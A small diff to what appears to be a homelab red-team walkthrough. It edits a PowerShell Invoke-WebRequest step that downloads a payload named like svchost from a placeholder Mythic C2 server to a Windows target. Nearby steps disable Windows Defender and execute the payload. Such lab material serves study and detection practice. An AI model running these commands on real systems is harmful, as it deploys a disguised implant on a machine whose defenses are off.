@@ -153,7 +153,7 @@ Disable Windows Defender:
 ![[Pasted image 20251018171120.png]]
 3. **Download on Windows Target**
     
-    `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe`
+    `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile "C:\Users\Public\Downloads\svchost-emaan.exe"`
     
     
 4. **Execute Payload**
